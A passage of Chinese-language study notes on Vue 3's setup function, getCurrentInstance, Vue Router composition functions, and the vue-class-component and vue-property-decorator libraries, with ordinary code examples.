  components: { RepositoriesFilters, RepositoriesSortBy, RepositoriesList },

  // props规则的定制
  props: {
    user: {
      type: String,
      required: true
    }
  },
  setup(props) {
    console.log(props)

    return {}
  }
  // 组件的“其余部分”
}
```

### **参数 props**
setup 函数中的 props 是响应式的 当传入新的 prop 时 它将被更新。
```js
export default {
  props: {
    title: String
  },
  setup(props) {
    console.log(props.title)
  }
}
```

**注意:**  
但是 因为 *props* 是响应式的 你*不能使用 ES6 解构* 它会消除 prop 的响应性。  
如果需要解构 prop 可以在 setup 函数中使用 toRefs 函数来完成此操作: 
```js
import { toRefs } from 'vue'

setup(props) {
  const { title } = toRefs(props)

  console.log(title.value)
}
```

<br>

### **参数 Context:**
传递给 setup 函数的第二个参数是 context。  
context 是一个普通 JavaScript 对象 暴露了其它可能在 setup 中有用的值: 
```js
export default {
  setup(props, context) {
    // Attribute (非响应式对象 等同于 $attrs)
    console.log(context.attrs)

    // 插槽 (非响应式对象 等同于 $slots)
    console.log(context.slots)

    // 触发事件 (方法 等同于 $emit)
    console.log(context.emit)

    // 暴露公共 property (函数)
    console.log(context.expose)
  }
}
```

context 是一个普通的 JavaScript 对象 也就是说 它不是响应式的 这意味着你可以安全地对 context 使用 ES6 解构。
```js
export default {
  setup(props, { attrs, slots, emit, expose }) {
    ...
  }
}
```

<br><br>

### **vue3.0中的this : getCurrentInstance 获取组件实例**
getCurrentInstance代表全局上下文 ctx相当于Vue2的this

**注意:**
ctx代替this只适用于开发阶段 等你放到服务器上运行就会出错 后来查阅资料说的得用proxy替代ctx 才能在你项目正式上线版本正常运行

<br>

### **获取 proxy**
使用方式:
```js
import {getCurrentInstance} from "vue"

setup() {
  let {proxy} = getCurrentInstance()
}
```

### **proxy身上就是组件实例身上的属性和方法**
```js
console.log("proxy", proxy)
console.log("proxy.$nuxt", proxy.$nuxt)

console.log("proxy.$router", proxy.$router)
console.log("proxy.$route", proxy.$route)

console.log("proxy.$axios", proxy.$axios)
console.log("proxy.$config", proxy.$config)

console.log("proxy.$data", proxy.$data)   // 这个没有
```

<br>

### **在 setup 中访问路由和当前路由**
https://router.vuejs.org/zh/guide/advanced/composition-api.html#%E5%AF%BC%E8%88%AA%E5%AE%88%E5%8D%AB

因为我们在 setup 里面没有访问 this 所以我们不能再直接访问 this.$router 或 this.$route。作为替代 我们使用 useRouter 函数: 

**import { useRouter, useRoute } from 'vue-router'**

```js
import { useRouter, useRoute } from 'vue-router'

export default {
  setup() {
    const router = useRouter()
    const route = useRoute()

    function pushWithQuery(query) {
      router.push({
        name: 'search',
        query: {
          ...route.query,
        },
      })
    }
  },
}
```

<br><br>

# **Vue-component-class 类组件:**
Vue 类组件是一个库 可让您以 react 类样式语法制作 Vue 组件。

<br>

### **安装**
```
npm install --save vue vue-class-component
```

### **引入**
```
import Vue from 'vue'
import Component from 'vue-class-component'
```

### **使用**
```js
@Component
export default class HelloWorld extends Vue {}
```

### **类组件内部数据的声明:**
**方式1:直接写在 类内部**  
```js
属性名 = 属性值 的方式
```

**注意:**  
如果数据的初始值是 undefined 的话 则该属性不是响应式的  
为了避免上述的情况 我们可以给数据赋 null 值

初始化属性的赋值方式:
```
属性名 = null
```

```html
<template>
  <div>{{ message }}</div>
</template>

<script>
import Vue from 'vue'
import Component from 'vue-class-component'

@Component
export default class HelloWorld extends Vue {
  // Declared as component data
  message = 'Hello World!'
}
</script>
```

### **方式2: 使用data配置项**
没错 我们仍然可以在 类组件内容使用data配置项的形式来给属性赋值  
该方式的数据都是响应式的
```js
import Vue from 'vue'
import Component from 'vue-class-component'

@Component
export default class HelloWorld extends Vue {
  // `message` will be reactive with `null` value
  message = null

  // See Hooks section for details about `data` hook inside class.
  data() {
    return {
      // `hello` will be reactive as it is declared via `data` hook.
      hello: undefined
    }
  }
}
```

<br>

### **类组件内部方法的声明**
我们可以直接在类组件的内容定义方法

**注意:**  
这里定义方法的时候 不能像react那样使用箭头函数 不然 this 会丢失
```html
<script>
import Vue from 'vue'
import Component from 'vue-class-component'

@Component
export default class HelloWorld extends Vue {
  // Declared as component method
  hello() {
    console.log('Hello World!')
  }
}
</script>
```

<br>

### **类组件内部 计算属性 的声明:**
将属性定义为 函数形式 前面加上 get

```html
<template>
  <input v-model="name">
</template>

<script>
import Vue from 'vue'
import Component from 'vue-class-component'

@Component
export default class HelloWorld extends Vue {
  firstName = 'John'
  lastName = 'Doe'

  // Declared as computed property getter
  get name() {
    return this.firstName + ' ' + this.lastName
  }

  // Declared as computed property setter
  set name(value) {
    const splitted = value.split(' ')
    this.firstName = splitted[0]
    this.lastName = splitted[1] || ''
  }
}
</script>
```

<br>

### **类组件中的 生命周期:**
直接在类组件中 写生命周期就可以
```js
import Vue from 'vue'
import Component from 'vue-class-component'

@Component
export default class HelloWorld extends Vue {
  // Declare mounted lifecycle hook
  mounted() {
    console.log('mounted')
  }

  // Declare render function
  render() {
    return <div>Hello World!</div>
  }
}
```

<br>

### **类组件中使用 props**
Vue 类组件没有为 props 定义提供专门的 API。  
但是 您可以通过使用规范Vue.extendAPI 来做到这一点: 

**步骤:**  
1. 使用 Vue.extend({}) 创建一个组件 内部定义 props
2. 定义我们的类组件 继承我们通过 Vue.extend({}) 创建的组件 这样类组件中就可以用 props 了

```html
<template>
  <div>{{ message }}</div>
</template>

<script lang="ts">
import Vue from 'vue'
import Component from 'vue-class-component'

// Define the props by using Vue's canonical way.
const GreetingProps = Vue.extend({
  props: {
    name: String
  }
})

// Use defined props by extending GreetingProps.
@Component
export default class Greeting extends GreetingProps {
  get message(): string {
    // this.name will be typed
    return 'Hello, ' + this.name
  }
}
</script>
```

<br>

### **其它选项:**
@component({})
装饰器里面可以传递一个配置对象 我们可以把其它的选项放到装饰器里面

```html
<template>
  <OtherComponent />
</template>

<script>
import Vue from 'vue'
import Component from 'vue-class-component'
import OtherComponent from './OtherComponent.vue'

@Component({
  // Specify `components` option.
  // See Vue.js docs for all available options:
  // https://vuejs.org/v2/api/#Options-Data
  components: {
    OtherComponent
  }
})
export default class HelloWorld extends Vue {}
</script>
```

<br>

### **类组件中 使用路由中的钩子**
1. 我们先定义一个js文件 名为: class-component-hooks.js
2. 利用Component注册要使用的钩子
```js
// class-component-hooks.js
import Component from 'vue-class-component'

// Register the router hooks with their names
Component.registerHooks([
  'beforeRouteEnter',
  'beforeRouteLeave',
  'beforeRouteUpdate'
])


// 类组件中就可以直接使用了
import Vue from 'vue'
import Component from 'vue-class-component'

@Component
export default class HelloWorld extends Vue {
  // The class component now treats beforeRouteEnter,
  // beforeRouteUpdate and beforeRouteLeave as Vue Router hooks
  beforeRouteEnter(to, from, next) {
    console.log('beforeRouteEnter')
    next()
  }

  beforeRouteUpdate(to, from, next) {
    console.log('beforeRouteUpdate')
    next()
  }

  beforeRouteLeave(to, from, next) {
    console.log('beforeRouteLeave')
    next()
  }
}
```

<br>

**注意:**
我们定义的钩子.js文件 在main.js里面引入  
将钩子注册的语句放在主文件的顶部来确保执行顺序: 

```js
import './class-component-hooks'

import Vue from 'vue'
import App from './App'

new Vue({
  el: '#app',
  render: h => h(App)
})
```

<br>

### **自定义装饰器**
Vue 类组件提供 createDecorator 了创建自定义装饰器

<br>

### **引入**
```
import { createDecorator } from 'vue-class-component'
```

<br>

### **创建自定义装饰器**
**<font color="#C2185B">createDecorator((options, key) => { ... })</font>**  
**参数:**
options: vue的配置对象  
key: 属性名 或 方法名  
parameterIndex: 如果自定义装饰器用于参数 则装饰参数的索引。

```js
// decorators.js
import { createDecorator } from 'vue-class-component'

// 声明一个自定义装饰器 
export const Log = createDecorator((options, key) => {

  // 将原来的方法保存起来
  const originalMethod = options.methods[key]

  // 在原来的方法的基础上添加了逻辑 也就是创建一个新的方法 将原来的方法包起来 在新方法的内容提供其它的逻辑
  options.methods[key] = function wrapperMethod(...args) {
    // Print a log.
    console.log(`Invoked: ${key}(`, ...args, ')')

    // Invoke the original method.
    originalMethod.apply(this, args)
  }
})
```

```js
import Vue from 'vue'
import Component from 'vue-class-component'
import { Log } from './decorators'

@Component
class MyComp extends Vue {
  // It prints a log when `hello` method is invoked.
  @Log
  hello(value) {
    // ...
  }
}
```

<br><br>

### **属性装饰器库   vue-property-decorator文档**  
此库完全依赖于vue-class-component, 所以请使用此库前, 先阅读它的文档
```
npm install vue-property-decorator -S
```

- @Prop
- @PropSync
- @Model
- @Watch
- @Provide
- @Inject
- @ProvideReactive
- @InjectReactive
- @Emit
- @Ref
- @Component (由 vue-class-component提供)
- Mixins (名为mixins的辅助函数, 由 vue-class-component提供)

https://www.jianshu.com/p/b497c44836d1


### **Prop装饰器**
**<font color="#C2185B">@Prop(Number) 标识符(readonly) 属性名: 可选类型 | 可选类型</font>**  
**<font color="#C2185B">@Prop({配置对象}) 标识符(readonly) 属性名: 可选类型 | 可选类型</font>**  
```js
import { Vue, Component, Prop } from 'vue-property-decorator'

@Component
export default class YourComponent extends Vue {
  @Prop(Number) readonly propA: number | undefined
  @Prop({ default: 'default value' }) readonly propB!: string
  @Prop([String, Boolean]) readonly propC: string | boolean | undefined
}
```

相当于
```js
export default {
  props: {
    propA: {
      type: Number
    },
    propB: {
      default: 'default value'
    },
    propC: {
      type: [String, Boolean]
    }
  }
}
```

<br>

### **@Watch:**
```js
import {Watch} from "vue-property-decorator";

@Watch("count", {
      immediate: true,
})
 getValue(val: string, oldVal: string) {
      console.log("val:", val, "  oldVal:", oldVal);
}
```

<br><br>

# routes 中的hidden 获取 routes数组
```js
[
  {
    path: "/page1",
    component: Page1,
    hidden: true
  }
]
```
该属性主要是用在 该路由是否应该被渲染 可能会用在权限管理的逻辑中

**要点:**  
我们可以通过 **$router.options.routes** 可以拿到初始化时配置的路由规则

```js
$router.options.routes 获取 routes 路由数组
```

他们身上都会有hidden值 另外 路由权限 还可以让 hidden: 从本地存储中取出一个字段 == 1 动态决定 hidden的值是什么

```js
hidden: localStorage.role === '1',
```